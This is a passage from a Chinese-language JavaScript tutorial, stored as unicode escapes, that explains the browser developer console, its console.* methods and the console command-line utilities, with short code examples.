\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u663e\u793a\u7f51\u9875\u4ee3\u7801\u8fd0\u884c\u65f6\u7684\u9519\u8bef\u4fe1\u606f\u3002 \u63d0\u4f9b\u4e86\u4e00\u4e2a\u547d\u4ee4\u884c\u63a5\u53e3\uff0c\u7528\u6765\u4e0e\u7f51\u9875\u4ee3\u7801\u4e92\u52a8\u3002 console \u5bf9\u8c61\u7684\u6d4f\u89c8\u5668\u5b9e\u73b0\uff0c\u5305\u542b\u5728\u6d4f\u89c8\u5668\u81ea\u5e26\u7684\u5f00\u53d1\u5de5\u5177\u4e4b\u4e2d\u3002\u4ee5 Chrome \u6d4f\u89c8\u5668\u7684\u201c\u5f00\u53d1\u8005\u5de5\u5177\u201d\uff08Developer Tools\uff09\u4e3a\u4f8b\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u4e09\u79cd\u65b9\u6cd5\u7684\u6253\u5f00\u5b83\u3002 \u6309 F12 \u6216\u8005 Control + Shift + i \uff08PC\uff09/ Command + Option + i \uff08Mac\uff09\u3002 \u6d4f\u89c8\u5668\u83dc\u5355\u9009\u62e9\u201c\u5de5\u5177/\u5f00\u53d1\u8005\u5de5\u5177\u201d\u3002 \u5728\u4e00\u4e2a\u9875\u9762\u5143\u7d20\u4e0a\uff0c\u6253\u5f00\u53f3\u952e\u83dc\u5355\uff0c\u9009\u62e9\u5176\u4e2d\u7684\u201cInspect Element\u201d\u3002 \u6253\u5f00\u5f00\u53d1\u8005\u5de5\u5177\u4ee5\u540e\uff0c\u9876\u7aef\u6709\u591a\u4e2a\u9762\u677f\u3002 Elements \uff1a\u67e5\u770b\u7f51\u9875\u7684 HTML \u6e90\u7801\u548c CSS \u4ee3\u7801\u3002 Resources \uff1a\u67e5\u770b\u7f51\u9875\u52a0\u8f7d\u7684\u5404\u79cd\u8d44\u6e90\u6587\u4ef6\uff08\u6bd4\u5982\u4ee3\u7801\u6587\u4ef6\u3001\u5b57\u4f53\u6587\u4ef6 CSS \u6587\u4ef6\u7b49\uff09\uff0c\u4ee5\u53ca\u5728\u786c\u76d8\u4e0a\u521b\u5efa\u7684\u5404\u79cd\u5185\u5bb9\uff08\u6bd4\u5982\u672c\u5730\u7f13\u5b58\u3001Cookie\u3001Local Storage\u7b49\uff09\u3002 Network \uff1a\u67e5\u770b\u7f51\u9875\u7684 HTTP \u901a\u4fe1\u60c5\u51b5\u3002 Sources \uff1a\u67e5\u770b\u7f51\u9875\u52a0\u8f7d\u7684\u811a\u672c\u6e90\u7801\u3002 Timeline \uff1a\u67e5\u770b\u5404\u79cd\u7f51\u9875\u884c\u4e3a\u968f\u65f6\u95f4\u53d8\u5316\u7684\u60c5\u51b5\u3002 Performance \uff1a\u67e5\u770b\u7f51\u9875\u7684\u6027\u80fd\u60c5\u51b5\uff0c\u6bd4\u5982 CPU \u548c\u5185\u5b58\u6d88\u8017\u3002 Console \uff1a\u7528\u6765\u8fd0\u884c JavaScript \u547d\u4ee4\u3002 \u8fd9\u4e9b\u9762\u677f\u90fd\u6709\u5404\u81ea\u7684\u7528\u9014\uff0c\u4ee5\u4e0b\u53ea\u4ecb\u7ecd Console \u9762\u677f\uff08\u53c8\u79f0\u4e3a\u63a7\u5236\u53f0\uff09\u3002 Console \u9762\u677f\u57fa\u672c\u4e0a\u5c31\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u7a97\u53e3\uff0c\u4f60\u53ef\u4ee5\u5728\u63d0\u793a\u7b26\u4e0b\uff0c\u952e\u5165\u5404\u79cd\u547d\u4ee4\u3002 console \u5bf9\u8c61\u7684\u9759\u6001\u65b9\u6cd5 \u00b6 console \u5bf9\u8c61\u63d0\u4f9b\u7684\u5404\u79cd\u9759\u6001\u65b9\u6cd5\uff0c\u7528\u6765\u4e0e\u63a7\u5236\u53f0\u7a97\u53e3\u4e92\u52a8\u3002 console.log()\uff0cconsole.info()\uff0cconsole.debug() \u00b6 console.log \u65b9\u6cd5\u7528\u4e8e\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u4fe1\u606f\u3002\u5b83\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6216\u591a\u4e2a\u53c2\u6570\uff0c\u5c06\u5b83\u4eec\u8fde\u63a5\u8d77\u6765\u8f93\u51fa\u3002 1 2 3 4 console . log ( 'Hello World' ) // Hello World console . log ( 'a' , 'b' , 'c' ) // a b c console.log \u65b9\u6cd5\u4f1a\u81ea\u52a8\u5728\u6bcf\u6b21\u8f93\u51fa\u7684\u7ed3\u5c3e\uff0c\u6dfb\u52a0\u6362\u884c\u7b26\u3002 1 2 3 4 5 6 console . log ( 1 ); console . log ( 2 ); console . log ( 3 ); // 1 // 2 // 3 \u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u683c\u5f0f\u5b57\u7b26\u4e32\uff08\u4f7f\u7528\u4e86\u683c\u5f0f\u5360\u4f4d\u7b26\uff09\uff0c console.log \u65b9\u6cd5\u5c06\u4f9d\u6b21\u7528\u540e\u9762\u7684\u53c2\u6570\u66ff\u6362\u5360\u4f4d\u7b26\uff0c\u7136\u540e\u518d\u8fdb\u884c\u8f93\u51fa\u3002 1 2 console . log ( ' %s + %s = %s' , 1 , 1 , 2 ) // 1 + 1 = 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c console.log \u65b9\u6cd5\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u6709\u4e09\u4e2a\u5360\u4f4d\u7b26\uff08 %s \uff09\uff0c\u7b2c\u4e8c\u3001\u4e09\u3001\u56db\u4e2a\u53c2\u6570\u4f1a\u5728\u663e\u793a\u65f6\uff0c\u4f9d\u6b21\u66ff\u6362\u6389\u8fd9\u4e2a\u4e09\u4e2a\u5360\u4f4d\u7b26\u3002 console.log \u65b9\u6cd5\u652f\u6301\u4ee5\u4e0b\u5360\u4f4d\u7b26\uff0c\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u5fc5\u987b\u4f7f\u7528\u5bf9\u5e94\u7684\u5360\u4f4d\u7b26\u3002 %s \u5b57\u7b26\u4e32 %d \u6574\u6570 %i \u6574\u6570 %f \u6d6e\u70b9\u6570 %o \u5bf9\u8c61\u7684\u94fe\u63a5 %c CSS \u683c\u5f0f\u5b57\u7b26\u4e32 1 2 3 4 5 var number = 11 * 9 ; var color = 'red' ; console . log ( '%d %s balloons' , number , color ); // 99 red balloons \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6570\u503c\uff0c\u5bf9\u5e94\u7684\u5360\u4f4d\u7b26\u662f %d \uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u5bf9\u5e94\u7684\u5360\u4f4d\u7b26\u662f %s \u3002 \u4f7f\u7528 %c \u5360\u4f4d\u7b26\u65f6\uff0c\u5bf9\u5e94\u7684\u53c2\u6570\u5fc5\u987b\u662f CSS \u4ee3\u7801\uff0c\u7528\u6765\u5bf9\u8f93\u51fa\u5185\u5bb9\u8fdb\u884c CSS \u6e32\u67d3\u3002 1 2 3 4 console . log ( '%cThis text is styled!' , 'color: red; background: yellow; font-size: 24px;' ) \u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u540e\uff0c\u8f93\u51fa\u7684\u5185\u5bb9\u5c06\u663e\u793a\u4e3a\u9ec4\u5e95\u7ea2\u5b57\u3002 console.log \u65b9\u6cd5\u7684\u4e24\u79cd\u53c2\u6570\u683c\u5f0f\uff0c\u53ef\u4ee5\u7ed3\u5408\u5728\u4e00\u8d77\u4f7f\u7528\u3002 1 2 console . log ( ' %s + %s ' , 1 , 1 , '= 2' ) // 1 + 1 = 2 \u5982\u679c\u53c2\u6570\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c console.log \u4f1a\u663e\u793a\u8be5\u5bf9\u8c61\u7684\u503c\u3002 1 2 3 4 console . log ({ foo : 'bar' }) // Object {foo: \"bar\"} console . log ( Date ) // function Date() { [native code] } \u4e0a\u9762\u4ee3\u7801\u8f93\u51fa Date \u5bf9\u8c61\u7684\u503c\uff0c\u7ed3\u679c\u4e3a\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002 console.info \u662f console.log \u65b9\u6cd5\u7684\u522b\u540d\uff0c\u7528\u6cd5\u5b8c\u5168\u4e00\u6837\u3002\u53ea\u4e0d\u8fc7 console.info \u65b9\u6cd5\u4f1a\u5728\u8f93\u51fa\u4fe1\u606f\u7684\u524d\u9762\uff0c\u52a0\u4e0a\u4e00\u4e2a\u84dd\u8272\u56fe\u6807\u3002 console.debug \u65b9\u6cd5\u4e0e console.log \u65b9\u6cd5\u7c7b\u4f3c\uff0c\u4f1a\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u8c03\u8bd5\u4fe1\u606f\u3002\u4f46\u662f\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c console.debug \u8f93\u51fa\u7684\u4fe1\u606f\u4e0d\u4f1a\u663e\u793a\uff0c\u53ea\u6709\u5728\u6253\u5f00\u663e\u793a\u7ea7\u522b\u5728 verbose \u7684\u60c5\u51b5\u4e0b\uff0c\u624d\u4f1a\u663e\u793a\u3002 console \u5bf9\u8c61\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u90fd\u53ef\u4ee5\u88ab\u8986\u76d6\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u6309\u7167\u81ea\u5df1\u7684\u9700\u8981\uff0c\u5b9a\u4e49 console.log \u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 9 [ 'log' , 'info' , 'warn' , 'error' ]. forEach ( function ( method ) { console [ method ] = console [ method ]. bind ( console , new Date (). toISOString () ); }); console . log ( \"\u51fa\u9519\u4e86\uff01\" ); // 2014-05-18T09:00.000Z \u51fa\u9519\u4e86\uff01 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 console.log \u65b9\u6cd5\uff0c\u53ef\u4ee5\u5728\u663e\u793a\u7ed3\u679c\u6dfb\u52a0\u5f53\u524d\u65f6\u95f4\u3002 console.warn()\uff0cconsole.error() \u00b6 warn \u65b9\u6cd5\u548c error \u65b9\u6cd5\u4e5f\u662f\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u4fe1\u606f\uff0c\u5b83\u4eec\u4e0e log \u65b9\u6cd5\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c warn \u65b9\u6cd5\u8f93\u51fa\u4fe1\u606f\u65f6\uff0c\u5728\u6700\u524d\u9762\u52a0\u4e00\u4e2a\u9ec4\u8272\u4e09\u89d2\uff0c\u8868\u793a\u8b66\u544a\uff1b error \u65b9\u6cd5\u8f93\u51fa\u4fe1\u606f\u65f6\uff0c\u5728\u6700\u524d\u9762\u52a0\u4e00\u4e2a\u7ea2\u8272\u7684\u53c9\uff0c\u8868\u793a\u51fa\u9519\u3002\u540c\u65f6\uff0c\u8fd8\u4f1a\u9ad8\u4eae\u663e\u793a\u8f93\u51fa\u6587\u5b57\u548c\u9519\u8bef\u53d1\u751f\u7684\u5806\u6808\u3002\u5176\u4ed6\u65b9\u9762\u90fd\u4e00\u6837\u3002 1 2 3 4 console . error ( 'Error: %s (%i)' , 'Server is not responding' , 500 ) // Error: Server is not responding (500) console . warn ( 'Warning! Too few nodes (%d)' , document . childNodes . length ) // Warning! Too few nodes (1) \u53ef\u4ee5\u8fd9\u6837\u7406\u89e3\uff0c log \u65b9\u6cd5\u662f\u5199\u5165\u6807\u51c6\u8f93\u51fa\uff08 stdout \uff09\uff0c warn \u65b9\u6cd5\u548c error \u65b9\u6cd5\u662f\u5199\u5165\u6807\u51c6\u9519\u8bef\uff08 stderr \uff09\u3002 console.table() \u00b6 \u5bf9\u4e8e\u67d0\u4e9b\u590d\u5408\u7c7b\u578b\u7684\u6570\u636e\uff0c console.table \u65b9\u6cd5\u53ef\u4ee5\u5c06\u5176\u8f6c\u4e3a\u8868\u683c\u663e\u793a\u3002 1 2 3 4 5 6 7 var languages = [ { name : \"JavaScript\" , fileExtension : \".js\" }, { name : \"TypeScript\" , fileExtension : \".ts\" }, { name : \"CoffeeScript\" , fileExtension : \".coffee\" } ]; console . table ( languages ); \u4e0a\u9762\u4ee3\u7801\u7684 language \u53d8\u91cf\uff0c\u8f6c\u4e3a\u8868\u683c\u663e\u793a\u5982\u4e0b\u3002 (index) name fileExtension 0 \"JavaScript\" \".js\" 1 \"TypeScript\" \".ts\" 2 \"CoffeeScript\" \".coffee\" \u4e0b\u9762\u662f\u663e\u793a\u8868\u683c\u5185\u5bb9\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 var languages = { csharp : { name : \"C#\" , paradigm : \"object-oriented\" }, fsharp : { name : \"F#\" , paradigm : \"functional\" } }; console . table ( languages ); \u4e0a\u9762\u4ee3\u7801\u7684 language \uff0c\u8f6c\u4e3a\u8868\u683c\u663e\u793a\u5982\u4e0b\u3002 (index) name paradigm csharp \"C#\" \"object-oriented\" fsharp \"F#\" \"functional\" console.count() \u00b6 count \u65b9\u6cd5\u7528\u4e8e\u8ba1\u6570\uff0c\u8f93\u51fa\u5b83\u88ab\u8c03\u7528\u4e86\u591a\u5c11\u6b21\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function greet ( user ) { console . count (); return 'hi ' + user ; } greet ( 'bob' ) // : 1 // \"hi bob\" greet ( 'alice' ) // : 2 // \"hi alice\" greet ( 'bob' ) // : 3 // \"hi bob\" \u4e0a\u9762\u4ee3\u7801\u6bcf\u6b21\u8c03\u7528 greet \u51fd\u6570\uff0c\u5185\u90e8\u7684 console.count \u65b9\u6cd5\u5c31\u8f93\u51fa\u6267\u884c\u6b21\u6570\u3002 \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u4f5c\u4e3a\u6807\u7b7e\uff0c\u5bf9\u6267\u884c\u6b21\u6570\u8fdb\u884c\u5206\u7c7b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 function greet ( user ) { console . count ( user ); return \"hi \" + user ; } greet ( 'bob' ) // bob: 1 // \"hi bob\" greet ( 'alice' ) // alice: 1 // \"hi alice\" greet ( 'bob' ) // bob: 2 // \"hi bob\" \u4e0a\u9762\u4ee3\u7801\u6839\u636e\u53c2\u6570\u7684\u4e0d\u540c\uff0c\u663e\u793a bob \u6267\u884c\u4e86\u4e24\u6b21\uff0c alice \u6267\u884c\u4e86\u4e00\u6b21\u3002 console.dir()\uff0cconsole.dirxml() \u00b6 dir \u65b9\u6cd5\u7528\u6765\u5bf9\u4e00\u4e2a\u5bf9\u8c61\u8fdb\u884c\u68c0\u67e5\uff08inspect\uff09\uff0c\u5e76\u4ee5\u6613\u4e8e\u9605\u8bfb\u548c\u6253\u5370\u7684\u683c\u5f0f\u663e\u793a\u3002 1 2 3 4 5 6 7 8 console . log ({ f1 : 'foo' , f2 : 'bar' }) // Object {f1: \"foo\", f2: \"bar\"} console . dir ({ f1 : 'foo' , f2 : 'bar' }) // Object // f1: \"foo\" // f2: \"bar\" // __proto__: Object \u4e0a\u9762\u4ee3\u7801\u663e\u793a dir \u65b9\u6cd5\u7684\u8f93\u51fa\u7ed3\u679c\uff0c\u6bd4 log \u65b9\u6cd5\u66f4\u6613\u8bfb\uff0c\u4fe1\u606f\u4e5f\u66f4\u4e30\u5bcc\u3002 \u8be5\u65b9\u6cd5\u5bf9\u4e8e\u8f93\u51fa DOM \u5bf9\u8c61\u975e\u5e38\u6709\u7528\uff0c\u56e0\u4e3a\u4f1a\u663e\u793a DOM \u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u3002 1 console . dir ( document . body ) Node \u73af\u5883\u4e4b\u4e2d\uff0c\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4ee5\u4ee3\u7801\u9ad8\u4eae\u7684\u5f62\u5f0f\u8f93\u51fa\u3002 1 console . dir ( obj , { colors : true }) dirxml \u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u4ee5\u76ee\u5f55\u6811\u7684\u5f62\u5f0f\uff0c\u663e\u793a DOM \u8282\u70b9\u3002 1 console . dirxml ( document . body ) \u5982\u679c\u53c2\u6570\u4e0d\u662f DOM \u8282\u70b9\uff0c\u800c\u662f\u666e\u901a\u7684 JavaScript \u5bf9\u8c61\uff0c console.dirxml \u7b49\u540c\u4e8e console.dir \u3002 1 2 3 console . dirxml ([ 1 , 2 , 3 ]) // \u7b49\u540c\u4e8e console . dir ([ 1 , 2 , 3 ]) console.assert() \u00b6 console.assert \u65b9\u6cd5\u4e3b\u8981\u7528\u4e8e\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u8fdb\u884c\u6761\u4ef6\u5224\u65ad\uff0c\u5982\u679c\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff0c\u5c31\u663e\u793a\u4e00\u4e2a\u9519\u8bef\uff0c\u4f46\u4e0d\u4f1a\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\u3002\u8fd9\u6837\u5c31\u76f8\u5f53\u4e8e\u63d0\u793a\u7528\u6237\uff0c\u5185\u90e8\u72b6\u6001\u4e0d\u6b63\u786e\u3002 \u5b83\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8868\u8fbe\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\u3002\u53ea\u6709\u5f53\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a false \uff0c\u624d\u4f1a\u63d0\u793a\u6709\u9519\u8bef\uff0c\u5728\u63a7\u5236\u53f0\u8f93\u51fa\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5426\u5219\u4e0d\u4f1a\u6709\u4efb\u4f55\u7ed3\u679c\u3002 1 2 3 4 5 6 7 8 9 10 11 console . assert ( false , '\u5224\u65ad\u6761\u4ef6\u4e0d\u6210\u7acb' ) // Assertion failed: \u5224\u65ad\u6761\u4ef6\u4e0d\u6210\u7acb // \u76f8\u5f53\u4e8e try { if ( ! false ) { throw new Error ( '\u5224\u65ad\u6761\u4ef6\u4e0d\u6210\u7acb' ); } } catch ( e ) { console . error ( e ); } \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5224\u65ad\u5b50\u8282\u70b9\u7684\u4e2a\u6570\u662f\u5426\u5927\u4e8e\u7b49\u4e8e500\u3002 1 console . assert ( list . childNodes . length < 500 , '\u8282\u70b9\u4e2a\u6570\u5927\u4e8e\u7b49\u4e8e500' ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u7b26\u5408\u6761\u4ef6\u7684\u8282\u70b9\u5c0f\u4e8e500\u4e2a\uff0c\u4e0d\u4f1a\u6709\u4efb\u4f55\u8f93\u51fa\uff1b\u53ea\u6709\u5927\u4e8e\u7b49\u4e8e500\u65f6\uff0c\u624d\u4f1a\u5728\u63a7\u5236\u53f0\u63d0\u793a\u9519\u8bef\uff0c\u5e76\u4e14\u663e\u793a\u6307\u5b9a\u6587\u672c\u3002 console.time()\uff0cconsole.timeEnd() \u00b6 \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7528\u4e8e\u8ba1\u65f6\uff0c\u53ef\u4ee5\u7b97\u51fa\u4e00\u4e2a\u64cd\u4f5c\u6240\u82b1\u8d39\u7684\u51c6\u786e\u65f6\u95f4\u3002 1 2 3 4 5 6 7 8 9 console . time ( 'Array initialize' ); var array = new Array ( 1000000 ); for ( var i = array . length - 1 ; i >= 0 ; i -- ) { array [ i ] = new Object (); }; console . timeEnd ( 'Array initialize' ); // Array initialize: 1914.481ms time \u65b9\u6cd5\u8868\u793a\u8ba1\u65f6\u5f00\u59cb\uff0c timeEnd \u65b9\u6cd5\u8868\u793a\u8ba1\u65f6\u7ed3\u675f\u3002\u5b83\u4eec\u7684\u53c2\u6570\u662f\u8ba1\u65f6\u5668\u7684\u540d\u79f0\u3002\u8c03\u7528 timeEnd \u65b9\u6cd5\u4e4b\u540e\uff0c\u63a7\u5236\u53f0\u4f1a\u663e\u793a\u201c\u8ba1\u65f6\u5668\u540d\u79f0: \u6240\u8017\u8d39\u7684\u65f6\u95f4\u201d\u3002 console.group()\uff0cconsole.groupEnd()\uff0cconsole.groupCollapsed() \u00b6 console.group \u548c console.groupEnd \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7528\u4e8e\u5c06\u663e\u793a\u7684\u4fe1\u606f\u5206\u7ec4\u3002\u5b83\u53ea\u5728\u8f93\u51fa\u5927\u91cf\u4fe1\u606f\u65f6\u6709\u7528\uff0c\u5206\u5728\u4e00\u7ec4\u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u7528\u9f20\u6807\u6298\u53e0/\u5c55\u5f00\u3002 1 2 3 4 5 6 7 8 console . group ( '\u4e00\u7ea7\u5206\u7ec4' ); console . log ( '\u4e00\u7ea7\u5206\u7ec4\u7684\u5185\u5bb9' ); console . group ( '\u4e8c\u7ea7\u5206\u7ec4' ); console . log ( '\u4e8c\u7ea7\u5206\u7ec4\u7684\u5185\u5bb9' ); console . groupEnd (); // \u4e8c\u7ea7\u5206\u7ec4\u7ed3\u675f console . groupEnd (); // \u4e00\u7ea7\u5206\u7ec4\u7ed3\u675f \u4e0a\u9762\u4ee3\u7801\u4f1a\u5c06\u201c\u4e8c\u7ea7\u5206\u7ec4\u201d\u663e\u793a\u5728\u201c\u4e00\u7ea7\u5206\u7ec4\u201d\u5185\u90e8\uff0c\u5e76\u4e14\u201c\u4e00\u7ea7\u5206\u7ec4\u201d\u548c\u201c\u4e8c\u7ea7\u5206\u7ec4\u201d\u524d\u9762\u90fd\u6709\u4e00\u4e2a\u6298\u53e0\u7b26\u53f7\uff0c\u53ef\u4ee5\u7528\u6765\u6298\u53e0\u672c\u7ea7\u7684\u5185\u5bb9\u3002 console.groupCollapsed \u65b9\u6cd5\u4e0e console.group \u65b9\u6cd5\u5f88\u7c7b\u4f3c\uff0c\u552f\u4e00\u7684\u533a\u522b\u662f\u8be5\u7ec4\u7684\u5185\u5bb9\uff0c\u5728\u7b2c\u4e00\u6b21\u663e\u793a\u65f6\u662f\u6536\u8d77\u7684\uff08collapsed\uff09\uff0c\u800c\u4e0d\u662f\u5c55\u5f00\u7684\u3002 1 2 3 4 5 6 console . groupCollapsed ( 'Fetching Data' ); console . log ( 'Request Sent' ); console . error ( 'Error: Server not responding (500)' ); console . groupEnd (); \u4e0a\u9762\u4ee3\u7801\u53ea\u663e\u793a\u4e00\u884c\u201dFetching Data\u201c\uff0c\u70b9\u51fb\u540e\u624d\u4f1a\u5c55\u5f00\uff0c\u663e\u793a\u5176\u4e2d\u5305\u542b\u7684\u4e24\u884c\u3002 console.trace()\uff0cconsole.clear() \u00b6 console.trace \u65b9\u6cd5\u663e\u793a\u5f53\u524d\u6267\u884c\u7684\u4ee3\u7801\u5728\u5806\u6808\u4e2d\u7684\u8c03\u7528\u8def\u5f84\u3002 1 2 3 4 5 6 console . trace () // console.trace() // (anonymous function) // InjectedScript._evaluateOn // InjectedScript._evaluateAndWrap // InjectedScript.evaluate console.clear \u65b9\u6cd5\u7528\u4e8e\u6e05\u9664\u5f53\u524d\u63a7\u5236\u53f0\u7684\u6240\u6709\u8f93\u51fa\uff0c\u5c06\u5149\u6807\u56de\u7f6e\u5230\u7b2c\u4e00\u884c\u3002\u5982\u679c\u7528\u6237\u9009\u4e2d\u4e86\u63a7\u5236\u53f0\u7684\u201cPreserve log\u201d\u9009\u9879\uff0c console.clear \u65b9\u6cd5\u5c06\u4e0d\u8d77\u4f5c\u7528\u3002 \u63a7\u5236\u53f0\u547d\u4ee4\u884c API \u00b6 \u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u4e2d\uff0c\u9664\u4e86\u4f7f\u7528 console \u5bf9\u8c61\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e9b\u63a7\u5236\u53f0\u81ea\u5e26\u7684\u547d\u4ee4\u884c\u65b9\u6cd5\u3002 \uff081\uff09 $_ $_ \u5c5e\u6027\u8fd4\u56de\u4e0a\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 2 + 2 // 4 $_ // 4 \uff082\uff09 $0 - $4 \u63a7\u5236\u53f0\u4fdd\u5b58\u4e86\u6700\u8fd15\u4e2a\u5728 Elements \u9762\u677f\u9009\u4e2d\u7684 DOM \u5143\u7d20\uff0c $0 \u4ee3\u8868\u5012\u6570\u7b2c\u4e00\u4e2a\uff08\u6700\u8fd1\u4e00\u4e2a\uff09\uff0c $1 \u4ee3\u8868\u5012\u6570\u7b2c\u4e8c\u4e2a\uff0c\u4ee5\u6b64\u7c7b\u63a8\u76f4\u5230 $4 \u3002 \uff083\uff09 $(selector) $(selector) \u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5143\u7d20\uff0c\u7b49\u540c\u4e8e document.querySelector() \u3002\u6ce8\u610f\uff0c\u5982\u679c\u9875\u9762\u811a\u672c\u5bf9 $ \u6709\u5b9a\u4e49\uff0c\u5219\u4f1a\u8986\u76d6\u539f\u59cb\u7684\u5b9a\u4e49\u3002\u6bd4\u5982\uff0c\u9875\u9762\u91cc\u9762\u6709 jQuery\uff0c\u63a7\u5236\u53f0\u6267\u884c $(selector) \u5c31\u4f1a\u91c7\u7528 jQuery \u7684\u5b9e\u73b0\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\u3002 \uff084\uff09 $$(selector) $$(selector) \u8fd4\u56de\u9009\u4e2d\u7684 DOM \u5bf9\u8c61\uff0c\u7b49\u540c\u4e8e document.querySelectorAll \u3002 \uff085\uff09 $x(path) $x(path) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b\u5339\u914d\u7279\u5b9a XPath \u8868\u8fbe\u5f0f\u7684\u6240\u6709 DOM \u5143\u7d20\u3002 1 $x ( \"//p[a]\" ) \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de\u6240\u6709\u5305\u542b a \u5143\u7d20\u7684 p \u5143\u7d20\u3002 \uff086\uff09 inspect(object) inspect(object) \u65b9\u6cd5\u6253\u5f00\u76f8\u5173\u9762\u677f\uff0c\u5e76\u9009\u4e2d\u76f8\u5e94\u7684\u5143\u7d20\uff0c\u663e\u793a\u5b83\u7684\u7ec6\u8282\u3002DOM \u5143\u7d20\u5728 Elements \u9762\u677f\u4e2d\u663e\u793a\uff0c\u6bd4\u5982 inspect(document) \u4f1a\u5728 Elements \u9762\u677f\u663e\u793a document \u5143\u7d20\u3002JavaScript \u5bf9\u8c61\u5728\u63a7\u5236\u53f0\u9762\u677f Profiles \u9762\u677f\u4e2d\u663e\u793a\uff0c\u6bd4\u5982 inspect(window) \u3002 \uff087\uff09 getEventListeners(object) getEventListeners(object) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u7684\u6210\u5458\u4e3a object \u767b\u8bb0\u4e86\u56de\u8c03\u51fd\u6570\u7684\u5404\u79cd\u4e8b\u4ef6\uff08\u6bd4\u5982 click \u6216 keydown \uff09\uff0c\u6bcf\u4e2a\u4e8b\u4ef6\u5bf9\u5e94\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u7684\u6210\u5458\u4e3a\u8be5\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 \uff088\uff09 keys(object) \uff0c values(object) keys(object) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b object \u7684\u6240\u6709\u952e\u540d\u3002 values(object) \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5305\u542b object \u7684\u6240\u6709\u952e\u503c\u3002 1 2 3 4 5 6 var o = { 'p1' : 'a' , 'p2' : 'b' }; keys ( o ) // [\"p1\", \"p2\"] values ( o ) // [\"a\", \"b\"] \uff089\uff09 monitorEvents(object[, events]) \uff0cunmonitorEvents(object[, events]) monitorEvents(object[, events]) \u65b9\u6cd5\u76d1\u542c\u7279\u5b9a\u5bf9\u8c61\u4e0a\u53d1\u751f\u7684\u7279\u5b9a\u4e8b\u4ef6\u3002\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a Event \u5bf9\u8c61\uff0c\u5305\u542b\u8be5\u4e8b\u4ef6\u7684\u76f8\u5173\u4fe1\u606f\u3002 unmonitorEvents \u65b9\u6cd5\u7528\u4e8e\u505c\u6b62\u76d1\u542c\u3002 1 2 monitorEvents ( window , \"resize\" ); monitorEvents ( window , [ \"resize\" , \"scroll\" ]) \u4e0a\u9762\u4ee3\u7801\u5206\u522b\u8868\u793a\u5355\u4e2a\u4e8b\u4ef6\u548c\u591a\u4e2a\u4e8b\u4ef6\u7684\u76d1\u542c\u65b9\u6cd5\u3002 1 2 monitorEvents ( $0 , 'mouse' ); unmonitorEvents ( $0 , 'mousemove' ); \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u5982\u4f55\u505c\u6b62\u76d1\u542c\u3002 monitorEvents 